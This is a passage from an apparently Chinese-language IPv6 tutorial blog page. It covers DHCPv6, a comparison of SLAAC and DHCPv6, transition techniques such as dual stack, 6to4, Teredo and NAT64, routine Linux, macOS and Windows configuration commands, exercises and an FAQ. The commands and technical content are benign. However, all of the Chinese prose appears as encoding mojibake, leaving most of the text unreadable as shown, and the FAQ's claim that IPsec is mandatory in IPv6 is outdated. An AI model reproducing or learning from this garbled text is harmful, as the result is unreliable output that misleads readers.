åœ°å€é€šè¿‡SLAACè·å–<br><span class="hljs-bullet">   -</span> DHCPv6åªæä¾›å…¶ä»–ä¿¡æ¯ï¼ˆDNSç­‰ï¼‰<br><br>æ¶ˆæ¯ç±»å‹ï¼š<br><span class="hljs-bullet">-</span> SOLICITï¼šå®¢æˆ·ç«¯è¯·æ±‚<br><span class="hljs-bullet">-</span> ADVERTISEï¼šæœåŠ¡å™¨é€šå‘Š<br><span class="hljs-bullet">-</span> REQUESTï¼šå®¢æˆ·ç«¯è¯·æ±‚åœ°å€<br><span class="hljs-bullet">-</span> REPLYï¼šæœåŠ¡å™¨å“åº”<br></code></pre></td></tr></table></figure><h3 id="4-3-é…ç½®æ–¹å¼å¯¹æ¯”"><a href="#4-3-é…ç½®æ–¹å¼å¯¹æ¯”" class="headerlink" title="4.3 é…ç½®æ–¹å¼å¯¹æ¯”"></a>4.3 é…ç½®æ–¹å¼å¯¹æ¯”</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs smali">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚   ç‰¹æ€§      â”‚  SLAAC   â”‚æ— çŠ¶æ€DHCPv6â”‚æœ‰çŠ¶æ€DHCPv6â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ åœ°å€è·å–    â”‚   RA     â”‚    RA    â”‚  DHCPv6  â”‚<br>â”‚ DNSè·å–     â”‚   âŒ     â”‚    âœ…    â”‚    âœ…    â”‚<br>â”‚ ä¸­å¤®ç®¡ç†    â”‚   âŒ     â”‚    âŒ    â”‚    âœ…    â”‚<br>â”‚ éƒ¨ç½²å¤æ‚åº¦  â”‚   ä½     â”‚    ä¸­    â”‚    é«˜    â”‚<br>â”‚ å³æ’å³ç”¨    â”‚   âœ…     â”‚    âœ…    â”‚    âŒ    â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>æ¨èï¼š<br>- å®¶åº­ç½‘ç»œï¼šSLAAC<br>- ä¼ä¸šç½‘ç»œï¼šæœ‰çŠ¶æ€DHCPv6<br>- æ··åˆç¯å¢ƒï¼šæ— çŠ¶æ€DHCPv6<br></code></pre></td></tr></table></figure><hr><h2 id="5-IPv6è¿‡æ¸¡æŠ€æœ¯"><a href="#5-IPv6è¿‡æ¸¡æŠ€æœ¯" class="headerlink" title="5. IPv6è¿‡æ¸¡æŠ€æœ¯"></a>5. IPv6è¿‡æ¸¡æŠ€æœ¯</h2><h3 id="5-1-åŒæ ˆï¼ˆDual-Stackï¼‰"><a href="#5-1-åŒæ ˆï¼ˆDual-Stackï¼‰" class="headerlink" title="5.1 åŒæ ˆï¼ˆDual Stackï¼‰"></a>5.1 åŒæ ˆï¼ˆDual Stackï¼‰</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs smali">åŒæ ˆ = IPv4 + IPv6åŒæ—¶è¿è¡Œ<br><br>åŸç†ï¼š<br>ä¸»æœºåŒæ—¶é…ç½®IPv4å’ŒIPv6åœ°å€<br><br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚   åº”ç”¨ç¨‹åº       â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  IPv4   â”‚  IPv6  â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚   ä¼ è¾“å±‚ï¼ˆTCPï¼‰  â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  ç‰©ç†å±‚          â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>ä¼˜ç‚¹ï¼š<br>âœ… å…¼å®¹æ€§å¥½<br>âœ… å¹³æ»‘è¿‡æ¸¡<br>âœ… åº”ç”¨æ— éœ€ä¿®æ”¹<br><br>ç¼ºç‚¹ï¼š<br>âŒ éœ€è¦IPv4å’ŒIPv6åŒä»½èµ„æº<br>âŒ ç®¡ç†å¤æ‚<br><br>ä½¿ç”¨åœºæ™¯ï¼š<br>- è¿‡æ¸¡åˆæœŸ<br>- é•¿æœŸå…±å­˜<br></code></pre></td></tr></table></figure><h3 id="5-2-éš§é“æŠ€æœ¯ï¼ˆTunnelingï¼‰"><a href="#5-2-éš§é“æŠ€æœ¯ï¼ˆTunnelingï¼‰" class="headerlink" title="5.2 éš§é“æŠ€æœ¯ï¼ˆTunnelingï¼‰"></a>5.2 éš§é“æŠ€æœ¯ï¼ˆTunnelingï¼‰</h3><p><strong>6to4éš§é“</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs markdown">IPv6æ•°æ®åŒ…å°è£…åœ¨IPv4ä¸­<br><br>åŸç†ï¼š<br>[IPv6æ•°æ®åŒ…]<br><span class="hljs-code">    â†“ å°è£…</span><br><span class="hljs-code">[IPv4å¤´éƒ¨ | IPv6æ•°æ®åŒ…]</span><br><span class="hljs-code">    â†“ ä¼ è¾“ï¼ˆIPv4ç½‘ç»œï¼‰</span><br><span class="hljs-code">[IPv4å¤´éƒ¨ | IPv6æ•°æ®åŒ…]</span><br><span class="hljs-code">    â†“ è§£å°è£…</span><br><span class="hljs-code">[IPv6æ•°æ®åŒ…]</span><br><span class="hljs-code"></span><br>ç±»å‹ï¼š<br><br><span class="hljs-bullet">1.</span> 6to4<br><span class="hljs-bullet">   -</span> è‡ªåŠ¨éš§é“<br><span class="hljs-bullet">   -</span> åœ°å€å‰ç¼€ï¼š2002::/16<br><span class="hljs-bullet">   -</span> åŒ…å«IPv4åœ°å€<br><br><span class="hljs-bullet">2.</span> 6in4ï¼ˆæ‰‹åŠ¨éš§é“ï¼‰<br><span class="hljs-bullet">   -</span> æ‰‹åŠ¨é…ç½®<br><span class="hljs-bullet">   -</span> ç‚¹å¯¹ç‚¹<br><br><span class="hljs-bullet">3.</span> Teredo<br><span class="hljs-bullet">   -</span> ç©¿è¶ŠNAT<br><span class="hljs-bullet">   -</span> åœ°å€å‰ç¼€ï¼š2001:0::/32<br><span class="hljs-bullet">   -</span> Windowså†…ç½®<br><br><span class="hljs-bullet">4.</span> ISATAP<br><span class="hljs-bullet">   -</span> ä¼ä¸šå†…éƒ¨<br><span class="hljs-bullet">   -</span> ç«™ç‚¹å†…è‡ªåŠ¨éš§é“<br></code></pre></td></tr></table></figure><h3 id="5-3-è½¬æ¢æŠ€æœ¯ï¼ˆTranslationï¼‰"><a href="#5-3-è½¬æ¢æŠ€æœ¯ï¼ˆTranslationï¼‰" class="headerlink" title="5.3 è½¬æ¢æŠ€æœ¯ï¼ˆTranslationï¼‰"></a>5.3 è½¬æ¢æŠ€æœ¯ï¼ˆTranslationï¼‰</h3><p><strong>NAT64</strong>ï¼š</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs smali">NAT64 = IPv6 â†” IPv4è½¬æ¢<br><br>åœºæ™¯ï¼š<br>IPv6å®¢æˆ·ç«¯è®¿é—®IPv4æœåŠ¡å™¨<br><br>åŸç†ï¼š<br>IPv6å®¢æˆ·ç«¯<br>    â†“ IPv6<br>NAT64ç½‘å…³<br>    â†“ IPv4<br>IPv4æœåŠ¡å™¨<br><br>åœ°å€æ˜ å°„ï¼š<br>IPv6: 64:ff9b::192.0.2.1<br>IPv4: 192.0.2.1<br><br>å·¥ä½œè¿‡ç¨‹ï¼š<br>1. IPv6å®¢æˆ·ç«¯è®¿é—® 64:ff9b::192.0.2.1<br>2. NAT64æå–IPv4åœ°å€ï¼š192.0.2.1<br>3. è½¬æ¢ä¸ºIPv4åŒ…ï¼Œå‘é€åˆ°æœåŠ¡å™¨<br>4. å“åº”è¿”å›ï¼Œè½¬æ¢ä¸ºIPv6åŒ…<br>5. å‘é€ç»™å®¢æˆ·ç«¯<br><br>é…åˆDNS64ï¼š<br>è‡ªåŠ¨å°†IPv4åœ°å€æ˜ å°„ä¸ºIPv6<br></code></pre></td></tr></table></figure><h3 id="5-4-è¿‡æ¸¡ç­–ç•¥"><a href="#5-4-è¿‡æ¸¡ç­–ç•¥" class="headerlink" title="5.4 è¿‡æ¸¡ç­–ç•¥"></a>5.4 è¿‡æ¸¡ç­–ç•¥</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">æ¨èè¿‡æ¸¡è·¯å¾„ï¼š<br><br>é˜¶æ®µ1ï¼šå‡†å¤‡ï¼ˆç°åœ¨ï¼‰<br><span class="hljs-bullet">- </span>å­¦ä¹ IPv6<br><span class="hljs-bullet">- </span>æµ‹è¯•è®¾å¤‡å…¼å®¹æ€§<br><span class="hljs-bullet">- </span>è§„åˆ’åœ°å€<br><br>é˜¶æ®µ2ï¼šéƒ¨ç½²åŒæ ˆï¼ˆ1-3å¹´ï¼‰<br><span class="hljs-bullet">- </span>å¯ç”¨IPv6<br><span class="hljs-bullet">- </span>ä¿ç•™IPv4<br><span class="hljs-bullet">- </span>åŒæ ˆè¿è¡Œ<br><br>é˜¶æ®µ3ï¼šä¼˜å…ˆIPv6ï¼ˆ3-5å¹´ï¼‰<br><span class="hljs-bullet">- </span>IPv6ä¼˜å…ˆ<br><span class="hljs-bullet">- </span>IPv4å¤‡ç”¨<br><span class="hljs-bullet">- </span>é€æ­¥å‡å°‘IPv4<br><br>é˜¶æ®µ4ï¼šçº¯IPv6ï¼ˆ5-10å¹´ï¼‰<br><span class="hljs-bullet">- </span>å®Œå…¨IPv6<br><span class="hljs-bullet">- </span>å¿…è¦æ—¶ä½¿ç”¨è½¬æ¢<br><span class="hljs-bullet">- </span>IPv4æ·˜æ±°<br><br>ç°å®ï¼š<br><span class="hljs-bullet">- </span>åŒæ ˆä¼šé•¿æœŸå­˜åœ¨<br><span class="hljs-bullet">- </span>å®Œå…¨è¿‡æ¸¡éœ€è¦æ—¶é—´<br><span class="hljs-bullet">- </span>åº”ç”¨å’Œè®¾å¤‡é€æ­¥æ”¯æŒ<br></code></pre></td></tr></table></figure><hr><h2 id="6-IPv6å®è·µ"><a href="#6-IPv6å®è·µ" class="headerlink" title="6. IPv6å®è·µ"></a>6. IPv6å®è·µ</h2><h3 id="6-1-æŸ¥çœ‹IPv6åœ°å€"><a href="#6-1-æŸ¥çœ‹IPv6åœ°å€" class="headerlink" title="6.1 æŸ¥çœ‹IPv6åœ°å€"></a>6.1 æŸ¥çœ‹IPv6åœ°å€</h3><p><strong>Linux&#x2F;macOS</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># æŸ¥çœ‹æ‰€æœ‰IPv6åœ°å€</span><br>ip -6 addr show<br>ifconfig<br><br><span class="hljs-comment"># æŸ¥çœ‹IPv6è·¯ç”±è¡¨</span><br>ip -6 route show<br><br><span class="hljs-comment"># æµ‹è¯•IPv6è¿æ¥</span><br>ping6 ::1<br>ping6 google.com<br><br><span class="hljs-comment"># è¿½è¸ªIPv6è·¯ç”±</span><br>traceroute6 google.com<br></code></pre></td></tr></table></figure><p><strong>Windows</strong>ï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cmd"># æŸ¥çœ‹IPv6åœ°å€<br><span class="hljs-built_in">ipconfig</span><br><br># æµ‹è¯•IPv6è¿æ¥<br><span class="hljs-built_in">ping</span> ::<span class="hljs-number">1</span><br><span class="hljs-built_in">ping</span> ipv6.google.com<br><br># è¿½è¸ªè·¯ç”±<br>tracert -<span class="hljs-number">6</span> google.com<br><br># æŸ¥çœ‹IPv6è·¯ç”±è¡¨<br>netsh interface ipv6 show route<br></code></pre></td></tr></table></figure><h3 id="6-2-é…ç½®IPv6"><a href="#6-2-é…ç½®IPv6" class="headerlink" title="6.2 é…ç½®IPv6"></a>6.2 é…ç½®IPv6</h3><p><strong>Linux</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å¯ç”¨IPv6</span><br>sysctl -w net.ipv6.conf.all.disable_ipv6=0<br><br><span class="hljs-comment"># é…ç½®é™æ€IPv6åœ°å€</span><br>ip -6 addr add 2001:db8::1/64 dev eth0<br><br><span class="hljs-comment"># é…ç½®IPv6ç½‘å…³</span><br>ip -6 route add default via 2001:db8::ff<br><br><span class="hljs-comment"># é…ç½®æ–‡ä»¶ï¼ˆ/etc/network/interfacesï¼‰</span><br>iface eth0 inet6 static<br>    address 2001:db8::1<br>    netmask 64<br>    gateway 2001:db8::ff<br></code></pre></td></tr></table></figure><p><strong>macOS</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># é…ç½®IPv6åœ°å€ï¼ˆç½‘ç»œåå¥½è®¾ç½®ï¼‰</span><br><span class="hljs-comment"># æˆ–ä½¿ç”¨networksetupå‘½ä»¤</span><br>networksetup -setv6manual Ethernet 2001:db8::1 64 2001:db8::ff<br></code></pre></td></tr></table></figure><hr><h2 id="7-å®æˆ˜é¡¹ç›®ï¼šIPv6åœ°å€å·¥å…·"><a href="#7-å®æˆ˜é¡¹ç›®ï¼šIPv6åœ°å€å·¥å…·" class="headerlink" title="7. å®æˆ˜é¡¹ç›®ï¼šIPv6åœ°å€å·¥å…·"></a>7. å®æˆ˜é¡¹ç›®ï¼šIPv6åœ°å€å·¥å…·</h2><h3 id="7-1-é¡¹ç›®éœ€æ±‚"><a href="#7-1-é¡¹ç›®éœ€æ±‚" class="headerlink" title="7.1 é¡¹ç›®éœ€æ±‚"></a>7.1 é¡¹ç›®éœ€æ±‚</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs markdown">åŠŸèƒ½éœ€æ±‚ï¼š<br><span class="hljs-bullet">1.</span> IPv6åœ°å€è§£æå’ŒéªŒè¯<br><span class="hljs-bullet">2.</span> åœ°å€å‹ç¼©å’Œæ‰©å±•<br><span class="hljs-bullet">3.</span> åœ°å€ç±»å‹è¯†åˆ«<br><span class="hljs-bullet">4.</span> EUI-64è®¡ç®—<br><span class="hljs-bullet">5.</span> IPv4/IPv6åœ°å€è½¬æ¢<br><span class="hljs-bullet">6.</span> åœ°å€èŒƒå›´è®¡ç®—<br><br>æŠ€æœ¯è¦æ±‚ï¼š<br><span class="hljs-bullet">-</span> Pythonå®ç°<br><span class="hljs-bullet">-</span> å‘½ä»¤è¡Œç•Œé¢<br><span class="hljs-bullet">-</span> æ”¯æŒå„ç§IPv6æ ¼å¼<br><span class="hljs-bullet">-</span> å‹å¥½çš„è¾“å‡º<br></code></pre></td></tr></table></figure><h3 id="7-2-å·¥å…·æ¼”ç¤º"><a href="#7-2-å·¥å…·æ¼”ç¤º" class="headerlink" title="7.2 å·¥å…·æ¼”ç¤º"></a>7.2 å·¥å…·æ¼”ç¤º</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># IPv6åœ°å€è§£æ</span><br>python day23_ipv6_tool.py --parse 2001:db8::1<br><br><span class="hljs-comment"># åœ°å€å‹ç¼©</span><br>python day23_ipv6_tool.py --compress 2001:0db8:0000:0000:0000:0000:0000:0001<br><br><span class="hljs-comment"># EUI-64è®¡ç®—</span><br>python day23_ipv6_tool.py --eui64 00:1a:2b:3c:4d:5e --prefix 2001:db8::/64<br></code></pre></td></tr></table></figure><hr><h2 id="8-ä»Šæ—¥ç»ƒä¹ "><a href="#8-ä»Šæ—¥ç»ƒä¹ " class="headerlink" title="8. ä»Šæ—¥ç»ƒä¹ "></a>8. ä»Šæ—¥ç»ƒä¹ </h2><h3 id="ç»ƒä¹ 1ï¼šåœ°å€å‹ç¼©"><a href="#ç»ƒä¹ 1ï¼šåœ°å€å‹ç¼©" class="headerlink" title="ç»ƒä¹ 1ï¼šåœ°å€å‹ç¼©"></a>ç»ƒä¹ 1ï¼šåœ°å€å‹ç¼©</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å‹ç¼©ä»¥ä¸‹IPv6åœ°å€ï¼š<br><span class="hljs-bullet">1.</span> 2001:0db8:0000:0000:0000:ff00:0042:8329<br><span class="hljs-bullet">2.</span> fe80:0000:0000:0000:0000:0000:0000:0001<br><span class="hljs-bullet">3.</span> 2001:0db8:0001:0000:0000:0000:0000:0001<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 2ï¼šåœ°å€è¯†åˆ«"><a href="#ç»ƒä¹ 2ï¼šåœ°å€è¯†åˆ«" class="headerlink" title="ç»ƒä¹ 2ï¼šåœ°å€è¯†åˆ«"></a>ç»ƒä¹ 2ï¼šåœ°å€è¯†åˆ«</h3><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elixir">è¯†åˆ«ä»¥ä¸‹åœ°å€ç±»å‹ï¼š<br><span class="hljs-number">1</span>. ::<span class="hljs-number">1</span><br><span class="hljs-number">2</span>. fe80::<span class="hljs-number">1</span><br><span class="hljs-number">3</span>. ff02::<span class="hljs-number">1</span><br><span class="hljs-number">4</span>. <span class="hljs-number">2001</span><span class="hljs-symbol">:db8</span>::<span class="hljs-number">1</span><br><span class="hljs-number">5</span>. fd00::<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 3ï¼šå­ç½‘åˆ’åˆ†"><a href="#ç»ƒä¹ 3ï¼šå­ç½‘åˆ’åˆ†" class="headerlink" title="ç»ƒä¹ 3ï¼šå­ç½‘åˆ’åˆ†"></a>ç»ƒä¹ 3ï¼šå­ç½‘åˆ’åˆ†</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">å°†2001<span class="hljs-function">:db8</span>::<span class="hljs-string">/32</span>åˆ†é…ç»™ï¼š<br>1. 256ä¸ª<span class="hljs-string">/40</span>å­ç½‘<br>2. æ¯ä¸ªå­ç½‘çš„<span class="hljs-string">/64</span>é“¾è·¯<br></code></pre></td></tr></table></figure><h3 id="ç»ƒä¹ 4ï¼šé…ç½®å®è·µ"><a href="#ç»ƒä¹ 4ï¼šé…ç½®å®è·µ" class="headerlink" title="ç»ƒä¹ 4ï¼šé…ç½®å®è·µ"></a>ç»ƒä¹ 4ï¼šé…ç½®å®è·µ</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> åœ¨æœ¬æœºå¯ç”¨IPv6<br><span class="hljs-bullet">2.</span> é…ç½®é“¾è·¯æœ¬åœ°åœ°å€<br><span class="hljs-bullet">3.</span> æµ‹è¯•è¿æ¥<br><span class="hljs-bullet">4.</span> æŸ¥çœ‹è·¯ç”±è¡¨<br></code></pre></td></tr></table></figure><hr><h2 id="9-å¸¸è§é—®é¢˜"><a href="#9-å¸¸è§é—®é¢˜" class="headerlink" title="9. å¸¸è§é—®é¢˜"></a>9. å¸¸è§é—®é¢˜</h2><p><strong>Q1ï¼šIPv6çœŸçš„å¿…è¦å—ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>æ˜¯çš„ï¼ŒIPv4åœ°å€å·²ç»è€—å°½</li><li>NATåªæ˜¯ä¸´æ—¶æ–¹æ¡ˆ</li><li>ç‰©è”ç½‘éœ€è¦å¤§é‡åœ°å€</li><li>IPv6æ˜¯é•¿è¿œè§£å†³æ–¹æ¡ˆ</li></ul><p><strong>Q2ï¼šä½•æ—¶å…¨é¢éƒ¨ç½²IPv6ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>å·²ç»åœ¨é€æ­¥éƒ¨ç½²</li><li>ä¸»è¦ç½‘ç«™å·²æ”¯æŒ</li><li>ISPé€æ­¥æä¾›</li><li>é¢„è®¡10-20å¹´å®Œå…¨è¿‡æ¸¡</li></ul><p><strong>Q3ï¼šIPv6æ¯”IPv4å¿«å—ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>ç†è®ºä¸Šæ›´å¿«ï¼ˆç®€åŒ–å¤´éƒ¨ï¼‰</li><li>å®é™…å·®å¼‚ä¸å¤§</li><li>ä¸»è¦ä¼˜åŠ¿åœ¨åœ°å€ç©ºé—´å’ŒåŠŸèƒ½</li></ul><p><strong>Q4ï¼šIPv6å®‰å…¨å—ï¼Ÿ</strong></p><p>Aï¼š</p><ul><li>IPSecæ˜¯å¼ºåˆ¶çš„</li><li>ä½†ä»éœ€è¦é˜²ç«å¢™</li><li>åœ°å€ç©ºé—´å¤§ï¼Œæ‰«æå›°éš¾</li><li>æ–°åè®®ï¼Œå¯èƒ½æœ‰æœªçŸ¥æ¼æ´</li></ul><p><strong>Q5ï¼šå¦‚ä½•æµ‹è¯•IPv6è¿æ¥ï¼Ÿ</strong></p><p>Aï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># è®¿é—®IPv6æµ‹è¯•ç½‘ç«™</span><br>http://test-ipv6.com<br>http://ipv6-test.com<br><br><span class="hljs-comment"># å‘½ä»¤è¡Œæµ‹è¯•</span><br>ping6 google.com<br>curl -6 http://ipv6.google.com<br></code></pre></td></tr></table></figure><hr><h2 id="10-æ€»ç»“"><a href="#10-æ€»ç»“" class="headerlink" title="10. æ€»ç»“"></a>10. æ€»ç»“</h2><p>ä»Šå¤©æˆ‘ä»¬å­¦ä¹ äº†ï¼š</p><h3 id="æ ¸å¿ƒçŸ¥è¯†ç‚¹"><a href="#æ ¸å¿ƒçŸ¥è¯†ç‚¹" class="headerlink" title="æ ¸å¿ƒçŸ¥è¯†ç‚¹"></a>æ ¸å¿ƒçŸ¥è¯†ç‚¹</h3><ol><li><p><strong>IPv6åŸºç¡€</strong>ï¼š</p><ul><li>128ä½åœ°å€</li><li>è§£å†³IPv4åœ°å€çŸ­ç¼º</li><li>ç®€åŒ–å¤´éƒ¨ï¼Œæé«˜æ•ˆç‡</li></ul></li><li><p><strong>åœ°å€æ ¼å¼</strong>ï¼š</p><ul><li>å†’å·åå…­è¿›åˆ¶è¡¨ç¤º</li><li>å‹ç¼©è§„åˆ™</li><li>å‰ç¼€è¡¨ç¤º</li></ul></li><li><p><strong>åœ°å€ç±»å‹</strong>ï¼š</p><ul><li>å•æ’­ï¼ˆå…¨å±€ã€é“¾è·¯æœ¬åœ°ã€ULAï¼‰</li><li>ä»»æ’­</li><li>å¤šæ’­ï¼ˆæ— å¹¿æ’­ï¼‰</li></ul></li><li><p><strong>æŠ¥æ–‡æ ¼å¼</strong>ï¼š</p><ul><li>å›ºå®š40å­—èŠ‚å¤´éƒ¨</li><li>æ‰©å±•å¤´éƒ¨æœºåˆ¶</li><li>ç®€åŒ–çš„å­—æ®µ</li></ul></li><li><p><strong>åœ°å€é…ç½®</strong>ï¼š</p><ul><li>SLAACï¼ˆè‡ªåŠ¨é…ç½®ï¼‰</li><li>DHCPv6</li><li>éšç§æ‰©å±•</li></ul></li><li><p><strong>è¿‡æ¸¡æŠ€æœ¯</strong>ï¼š</p><ul><li>åŒæ ˆ</li><li>éš§é“ï¼ˆ6to4ã€Teredoï¼‰</li><li>è½¬æ¢ï¼ˆNAT64ï¼‰</li></ul></li></ol><h3 id="é‡ç‚¹å›é¡¾"><a href="#é‡ç‚¹å›é¡¾" class="headerlink" title="é‡ç‚¹å›é¡¾"></a>é‡ç‚¹å›é¡¾</h3><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">IPv6åœ°å€ï¼š<br><span class="hljs-bullet">- 